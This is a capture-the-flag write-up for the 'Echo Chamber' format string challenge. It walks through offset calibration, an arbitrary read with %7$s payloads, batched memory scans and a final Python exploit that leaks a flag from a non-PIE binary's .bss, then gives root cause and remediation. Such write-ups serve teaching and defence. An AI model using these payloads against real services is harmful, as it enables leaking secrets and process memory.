# Echo Chamber — Full Detailed Writeup

**Challenge:** Echo Chamber (100 pts)
**Category:** Binary Exploitation / pwn — format string arbitrary read
**Target:** `10.10.0.13:1341`
**Flag:** `HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}`
**Status:** Solved

---

## 0. TL;DR

The service is a tiny non-PIE ELF that reads a line into a 256-byte buffer and
then passes that buffer directly to `printf()` as the **format string**:

```c
printf("me > ");
printf(buf);          // <- format string bug
putchar('\n');
```

Because the format string is the user's line, `%p` leaks the stack and `%s`
with a controlled argument gives an arbitrary read. The binary also contains
the literal path `flag.txt` and reads that file into a global buffer in `.bss`
at the fixed address `0x4040a0` (non-PIE, no ASLR for the binary image).

The exploit is therefore a one-liner: place `0x4040a0` in an argument slot and
print it with `%s`.

```python
payload = b"%7$sAAAA" + p64(0x4040a0)
```

Result:

```text
me > HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}
```

Flag:

```text
HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}
```

---

## 1. Initial Recon

The challenge directory contained only the VPN profile:

```text
Echo_Chamber/
└── hacklido-user1417.ovpn
```

No binary, source, or handout. The target was a raw TCP service.

### 1.1 Is the target reachable?

After connecting the VPN, the first check was a bare TCP connect:

```bash
timeout 5 bash -c 'cat < /dev/null > /dev/tcp/10.10.0.13/1341' \
  && echo "PORT OPEN" || echo "PORT CLOSED/FILTERED"
```

```text
PORT OPEN
```

So yes — once the VPN was up, the target was reachable and the challenge was
solvable. The previous problem was not the challenge itself, it was network
reachability.

### 1.2 First interaction

```bash
nc 10.10.0.13 1341
```

```text
==============================
   Echo Chamber  (easy)       
   say something, I'll echo.  
==============================
you> 
```

Sending `hello`:

```text
you> me > hello
you> 
```

The `you> ` is the prompt and `me > ` is added by the program before it prints
the user's line. The connection stays open and asks for more input, so this is
a loop, not a one-shot service.

---

## 2. Finding the Vulnerability

The name "Echo Chamber" and the phrase "repeats back anything you say" suggest
the input is being printed with `printf(user_input)`.

### 2.1 First probe: `%x`

```bash
printf '%%x.%%x.%%x.%%x.%%x.%%x.%%x.%%x\n' | nc 10.10.0.13 1341
```

```text
you> me > 4fec5640.0.0.5.5.252e7825.2e78252e.78252e78
you> 
```

The `%x` specifiers were interpreted. This is a **format string vulnerability**,
not a simple `puts(buf)` echo.

### 2.2 Second probe: `%p`

Sending `%p` repeatedly exposed the classic argument layout:

```text
me > 0x7ffd66fd9e20.(nil).(nil).0x5.0x5.0x70252e70252e7025...
```

The first argument is a stack pointer, then `(nil)`, then `0x5`, and from
offset 6 onward the output is just our own format string read back as 8-byte
qwords (`0x70252e70252e7025` is `"%p.%p..."` in little-endian).

### 2.3 First failed dump: one giant format string

The first instinct was to dump many arguments at once:

```text
40=%40p.41=%41p.42=%42p. ...
```

That produced a confusing, mangled response:

```text
me > 40=0x7ffce32f0910.41=(nil)....71=0x2e703636253d3636you> me > .72=...
```

At the time this looked like the offset of the input buffer had jumped from 6
to 45, which made no sense. **This was the first wrong turn.** The real cause was
the program's **256-byte input limit**: the long line was truncated, and the
remaining bytes were processed as a *second* line. The `you> me > .72=` in the
middle of the output was the second read, not a shifted stack frame.

Lesson learned: keep each request short, and do not trust offsets derived from
a payload longer than the program's read size.

---

## 3. Calibrating the Argument Offsets

To find exactly which `%N$` index maps to the start of our buffer, a known
marker was placed at the beginning of the input:

```text
AAAABBBB1:%1$p.2:%2$p.3:%3$p...19:%19$p
```

Output:

```text
me > AAAABBBB1:0x7ffcf09cd190.2:(nil).3:(nil).4:0x5.5:0x5.
    6:0x4242424241414141.7:0x322e702431253a31...
```

`0x4242424241414141` is `AAAABBBB`, so:

| Argument index | Meaning |
|---|---|
| `%1$p` | stack pointer |
| `%2$p`, `%3$p` | `(nil)` |
| `%4$p`, `%5$p` | `0x5` |
| `%6$p` | **first 8 bytes of our input buffer** |
| `%7$p` | second 8 bytes |
| `%8$p` ... | rest of the buffer |

Then a short-payload scan of `%N$p` for `N = 9..300` was done (one short line
per request, same connection). The interesting non-zero offsets were:

```text
39   0x70e274158083        heap/libc pointer
41   0x7ffefc700448        stack pointer
42   0x17431c7a0           heap-ish value
43   0x4012ee              code address (main)
44   0x4013b0              code address
46   0x401110              code address
47   0x7ffefc700440        stack pointer
56   0x7ffefc700448        stack pointer
57   0x7ffefc700458        stack pointer
58   0x70e27435a190        heap pointer
61   0x401110              code address
62   0x7ffefc700440        stack pointer
65   0x40113e              code address
69   0x7ffefc700eb6        pointer to "./echo"
71   0x7ffefc700ebd        pointer to "HOSTNAME=..."
72   0x7ffefc700ed3        pointer to "SOCAT_PEERADDR=..."
...
82   0x7ffefc700fd6        pointer to "SOCAT_PID=..."
86   0x7ffefc7a7000        vDSO ELF header
102  0x70e27432b000        heap/mmap pointer
```

The code addresses (`0x4012ee`, `0x401110`, ...) proved the binary is
**non-PIE**: it is mapped at a fixed base of `0x400000`.

---

## 4. Failed Hypothesis: Is the Secret in the Environment?

The challenge says the secret is loaded "into memory" each morning. A common
pattern is an environment variable or `argv`, so the pointers at offsets 69–82
were dereferenced with `%N$s`.

```text
69 => './echo'
71 => 'HOSTNAME=a844abac84a1'
72 => 'SOCAT_PEERADDR=172.30.0.1'
73 => 'HOME=/home/ctf'
74 => 'OLDPWD=/home/ctf'
75 => 'SOCAT_PEERPORT=55784'
76 => 'SOCAT_SOCKADDR=172.30.0.13'
77 => 'SOCAT_VERSION=1.7.3.3'
78 => 'SOCAT_SOCKPORT=1341'
79 => 'PATH=/usr/local/sbin:...'
80 => 'DEBIAN_FRONTEND=noninteractive'
81 => 'PWD=/home/ctf'
82 => 'SOCAT_PID=38'
83 => 'SOCAT_PPID=11'
```

This dumped the whole environment, but there was **no secret**, no flag, and no
interesting variable.

**Approach change #1:** stop looking at the environment. The secret must be in
a file or a global buffer, and the only way to get it is to turn the format
string into a real **arbitrary read**.

---

## 5. Building an Arbitrary Read

On x86-64, `printf` reads arguments after the fifth from the stack. Since the
input buffer itself is on the stack, the bytes of the buffer are both the
format string and (part of) the argument list. The trick is to place a target
address at a known 8-byte-aligned offset in the buffer, then reference that
slot with `%N$s`.

### 5.1 The formula

The buffer starts at argument index 6:

```text
arg_index(address at position P) = 6 + (P / 8)
```

So an address placed at byte position 8 of the buffer is argument 7:

```python
payload = b"%7$sAAAA" + p64(address)
#          ^^^^^^^^  ^^^^^  ^^^^^^^^^^^
#          format    pad    address at position 8 -> arg 7
```

### 5.2 Why null bytes are not a problem

x86-64 addresses are `0x0000_7fff_xxxx_xxxx` or `0x0000_0000_0040_xxxx`, so the
high bytes are `\x00`. If the address were placed *before* the format specifier,
`printf` would stop scanning at the first null and never reach `%7$s`.

Putting the address **after** the format string avoids that:

- `printf` scans `%7$s` first.
- It fetches the argument from stack slot 7 (our address).
- Only afterwards does it treat the following literal bytes (padding and the
  address itself) as text, stopping at the first null.

### 5.3 Validation

Reading known memory:

| Address | Output | Meaning |
|---|---|---|
| `0x400000` | `\x7fELF\x02\x01\x01` | ELF magic |
| `0x401000` | `\xf3\x0f\x1e\xfaH\x83\xec\x08...` | `endbr64; sub rsp, 8; ...` |
| `0x4012ee` | `\xf3\x0f\x1e\xfaUH\x89\xe5H\x81\xec...` | `endbr64; push rbp; mov rbp,rsp; sub rsp, ...` — `main` |

`0x4012ee` is the start of `main`, which matches the stack values leaked at
offset 43. Arbitrary read works.

---

## 6. Failed Attempt: Dumping the Binary One Byte at a Time

The next goal was to dump the binary and find where `flag.txt` is read. A first
dumper was written that:

1. Opened a fresh connection per `%s` read.
2. Appended a unique marker `\x01MK\x02` after the format spec so the raw string
   could be separated from the literal padding.
3. Advanced past each terminating null to reconstruct binary bytes.

It **timed out**. The reason: the service waits about **1 second per echoed
line**.

Measured round-trip times:

```text
prompt wait 1.010
b'hi'    0.9971
b'%p'    0.9757
b'%7$p'  2.0796
```

So a one-byte-per-request or one-string-per-request dumper is far too slow for
a 16 KB binary. **Approach change #2:** batch many `%s` reads into one request.

---

## 7. Batching Reads (and the 256-Byte Limit, Again)

A single request can contain many format specifiers, each pointing at a
different address:

```text
%N$s|%N+1$s|%N+2$s|...|MARK|padding|addr0|addr1|addr2|...
```

All addresses are written contiguously at an 8-byte-aligned position, so each
specifier references the next qword. The literal `|` separators let the
response be split back into one string per address.

This was validated against known addresses:

```text
n=1   len=24   -> '\x7fELF\x02\x01\x01'
n=2   len=32   -> ['\x7fELF...', '']
n=4   len=64   -> ['\x7fELF...', '', '\x02', '\x10\x11@']
n=16  len=232  -> works
n=20  len=288  -> FAIL: no marker (connection died)
n=24  len=344  -> FAIL: no marker
```

Again the **256-byte input buffer** was the culprit. With a 288-byte payload,
the first 256 bytes were processed and the remaining address-table bytes became
a second line, so some `%s` arguments read garbage addresses and crashed the
process.

**Fix:** keep each batch payload at or below 256 bytes. A batch of 16 addresses
takes 232 bytes and works reliably, covering 128 bytes of memory per request.

The 1-second delay means this is still slow (~128 bytes/s), but enough for a
targeted scan of a few pages.

Another early scan failure was reading `0x405000` and above:

```text
0x405000 ERR nomark b'me > '
0x406000 ERR nomark b'me > '
```

The binary image ends before `0x405000`; dereferencing an unmapped page
segfaults the process. The scan had to stay inside the mapped pages.

---

## 8. Finding the Secret

With batching working, the region `0x402000`–`0x405000` was scanned
(16 addresses per request, 8-byte stride). The scan immediately found the
string table:

```text
0x402000 b'\x01'
0x402008 b'flag.txt'
0x402018 b'=============================='
0x402038 b'   Echo Chamber  (easy)       '
0x402058 b"   say something, I'll echo.  "
0x402078 b'ou> '
0x402088 b'P'
```

The literal `flag.txt` at `0x402008` confirms the program reads a file named
`flag.txt`. The same scan continued into `.data`/`.bss` and eventually hit:

```text
0x403ee8 b'`AX^_{'
...
0x404040 b'\xe0,>^_{'
0x404060 b'\xa0\xb6T^_{'
0x404070 b'\x80\xa9T^_{'
0x404080 b'\xc0\xb5T^_{'
0x4040a0 b'HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}\n'
```

The scan had covered `0x402000`–`0x405000`; the flag was sitting in `.bss` at
`0x4040a0`, read from `flag.txt` into a global buffer before the prompt loop
started.

### Verification with single reads

```text
0x4040a0 b'HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}\n'
0x4040a8 b'f0rm4t_str1ng_l34k_th3_s3cr3t}\n'
0x4040b0 b'tr1ng_l34k_th3_s3cr3t}\n'
0x404090 b''
```

The flag starts exactly at `0x4040a0`.

---

## 9. Final Exploit

No stack leak is even needed: the binary is non-PIE, so the `.bss` address is
constant. The address is placed at buffer position 8 and read with `%7$s`.

```python
import socket
import struct

HOST, PORT = "10.10.0.13", 1341
SECRET = 0x4040A0

s = socket.create_connection((HOST, PORT), timeout=5)
s.recv(4096)                              # banner + "you> "

payload = b"%7$sAAAA" + struct.pack("<Q", SECRET)
s.sendall(payload + b"\n")

data = b""
while b"you> " not in data:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

print(data.decode("latin1"))
s.close()
```

Output:

```text
me > HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}
AAAA\xa0@@you> 
```

The `AAAA\xa0@@` is the literal padding and the first three bytes of the
address (`a0 40 40`) printed after the string, which is expected.

### One-shot shell version

```bash
python3 -c 'import socket,struct,sys; s=socket.create_connection(("10.10.0.13",1341)); s.recv(4096); s.sendall(b"%7$sAAAA"+struct.pack("<Q",0x4040a0)+b"\n"); import time; time.sleep(1.2); print(s.recv(4096).decode("latin1"))'
```

Flag:

```text
HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}
```

---

## 10. Root Cause

The program does the equivalent of:

```c
char buf[256];

load_secret("/home/ctf/flag.txt", secret_buf);   // secret_buf at 0x4040a0

while (1) {
    write(1, "you> ", 5);
    read(0, buf, 256);
    printf("me > ");
    printf(buf);          // <-- user input used as format string
    putchar('\n');
}
```

Two mistakes combine:

1. **User input is used as a format string.** Any `%p`, `%s`, `%x`, `%n` in the
   input is interpreted by `printf`.
2. **The secret is in a fixed, non-PIE global buffer.** Combined with arbitrary
   read via `%s`, its address is trivial to reference.

The 256-byte `read()` is what caused the long-payload truncation that looked
like an offset shift during recon.

---

## 11. Dead Ends and How the Approach Changed

| # | Attempt | Result | Why it failed | What changed |
|---|---|---|---|---|
| 1 | `%x`, `%p` probes | Confirmed format string | — | Proceeded to offset scan |
| 2 | One giant format string with `%40$p...%159$p` | Mangled output, apparent offset jump to 45 | Input was truncated at 256 bytes; remainder processed as a new line | Used short, single-specifier requests |
| 3 | `%N$s` over argv/env pointers | Full environment dump, no secret | Secret was not an env var | Switched to arbitrary read |
| 4 | Dump binary one string at a time | Shell timeout | Service sleeps ~1 s per line; thousands of requests needed | Built batched multi-`%s` reads |
| 5 | Batch of 20–24 addresses | `nomark`, process died | Payload exceeded 256-byte input buffer; address table truncated | Capped batches at 16 addresses (232 bytes) |
| 6 | Scan `0x403000`–`0x406000` in one pass | `nomark` on many batches | Reads at `0x405000+` hit unmapped pages and crashed | Restricted scan to the mapped image region |
| 7 | Assumed secret in `.text`/`.rodata` | Nothing | Secret is in `.bss` | Scanned through `0x402000`–`0x405000` and found it at `0x4040a0` |
| 8 | Stack-leak-dependent exploit | Not needed | Binary is non-PIE; address is fixed | Used hardcoded `0x4040a0` directly |

---

## 12. Lessons

- **A format string is an arbitrary read primitive** once you can place a
  pointer in an argument slot. The index is `6 + position/8` on x86-64.
- **Matches at the start of the buffer** (`AAAABBBB` → `0x4242424241414141`)
  are the fastest way to calibrate `%N$` offsets.
- **Respect the program's read size.** A 256-byte buffer silently truncates
  long payloads and turns one request into two, which corrupts offset analysis.
- **Non-PIE binaries have fixed data addresses.** If the secret is in `.bss`,
  you do not need a stack leak at all.
- **Service timing matters.** At ~1 request/second, one-string-at-a-time dumping
  is impractical; batching multiple `%s` per request is required.
- **Dereferencing unmapped memory kills the process.** Scanning must stay inside
  mapped pages, or each out-of-range read costs a reconnect.

---

## 13. Remediation

- Never pass user input directly to `printf`. Use `printf("%s", buf)` or
  `fputs(buf, stdout)`.
- Compile with format-string protections (`-Wformat -Werror=format-security`)
  and enable `-fstack-protector`, PIE, and RELRO.
- Do not keep secrets in a global buffer for the lifetime of a long-running
  chat service; read and wipe them per request, or better, do not expose a
  process that has the secret mapped at all.
- Enforce strict input validation and a bounded line length, but do not rely on
  truncation as a security control.

---

## 14. Flag

```text
HackCTF{f0rm4t_str1ng_l34k_th3_s3cr3t}
```
